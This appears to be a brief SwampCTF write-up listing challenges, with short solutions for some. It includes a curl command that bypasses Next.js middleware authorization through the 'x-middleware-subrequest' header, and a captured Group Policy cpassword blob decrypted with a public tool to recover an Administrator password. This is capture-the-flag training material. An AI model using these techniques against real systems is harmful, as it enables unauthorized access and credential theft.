* * *
### CTF: **SwampCTF**
* * *

![image](https://github.com/user-attachments/assets/e85ba37f-462c-4762-9886-468bf675e5ea)


--------------------------------

### Challenges

- Web:
  - Serialies
  - SlowAPI 

- Pwn:
  - Beginner Pwn 1
  - Beginner Pwn 2

- Misc:
  - Lost In Translation 
    
- Forensics:
  - Preferential Treatment

- Osint:
  - Party Time! 
  - Party Time! Level 2 

- Crypto:
  - Rock my Password 
  - Intercepted communications
  
--------------------------------
   
### Web:

### Challenge: Serialies
![image](https://github.com/user-attachments/assets/64b27c27-c8b1-4d4a-8e72-2859105706a7)

After I Download the file ```serialies.zip```
In the PersonController.java file, we find the /api/person endpoint. Navigating there gives us the flag.

![image](https://github.com/user-attachments/assets/9bf8ffdd-7fa3-44e9-80a8-df9f40389e33)
swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}

--------------------------------


### Challenge: SlowAPI 
![image](https://github.com/user-attachments/assets/7639e47e-e6fb-4373-9cc0-c5fc4bfc6e2d)

- IT The RECENT NEXT.JS VULNERABILITY!!!!
```curl -H "x-middleware-subrequest: middleware" http://chals.swampctf.com:43611/api/protected/flag```
      
--------------------------------


### PWN:

### Challenge: Beginner Pwn 1
![image](https://github.com/user-attachments/assets/708c2055-022e-4c34-a702-e39f67354b5a)

- Solve script

 
### Challenge: Beginner Pwn 2
![image](https://github.com/user-attachments/assets/cc125998-d69a-423d-b5e8-3bdd7eebf32e)

- Solve Script


--------------------------------

### MISC

### Challenge: Lost In Translation

![image](https://github.com/user-attachments/assets/32e32d6b-eee6-4494-8e1c-b35f7c53510a)

After i unzip the file, there is challenge.js and i Copy and paste the challenge.js to this whitespace "https://www.dcode.fr/whitespace-language"</a>




  
--------------------------------

### FORENSICS:

### Challenge: Preferential Treatment:
![image](https://github.com/user-attachments/assets/84ac06e1-0957-45a5-ab7b-3c04a9dbc6b6)

when checking the pcap following the tcp you can see the following:
"<Groups clsid="{3125E937-EC16-4b4c-9934-544FC6D24D26}">
    <User clsid="{DF5F1855-52E5-4d24-8B1A-D9BDE98BA1D1}" name="swampctf.com\Administrator" image="2"
          changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
        <Properties action="U" newName="" fullName="" description=""
                    cpassword="dAw7VQvfj9rs53A8t4PudTVf85Ca5cmC1Xjx6TpI/cS8WD4D8DXbKiWIZslihdJw3Rf+ijboX7FgLW7pF0K6x7dfhQ8gxLq34ENGjN8eTOI="
                    changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="swampctf.com\Administrator"/>
    </User>
</Groups>"
then I looked up what that was and realized it was a weakly encrypted password
so I found a repo to decrypt it.
"https://github.com/t0thkr1s/gpp-decrypt"



--------------------------------


### OSINT      

### Challenge: Party Time! 
![image](https://github.com/user-attachments/assets/f3f16896-d45f-461a-9c41-b047cb34c697)



### Challenge: Party Time! Level 2
![image](https://github.com/user-attachments/assets/dcd2698c-1dd1-479b-b215-517fa5dec4f3)



--------------------------------

### CRYPTO:

### Challenge: Rock my Password 
![image](https://github.com/user-attachments/assets/bba615e3-4145-4d6d-9129-5a296d8598ba)


### Challenge: Intercepted communications
![image](https://github.com/user-attachments/assets/b84f48ac-de68-4af6-b0cd-dc8dd0cdf699)





--------------------------------

Thanks for reading!!!!!

* * *

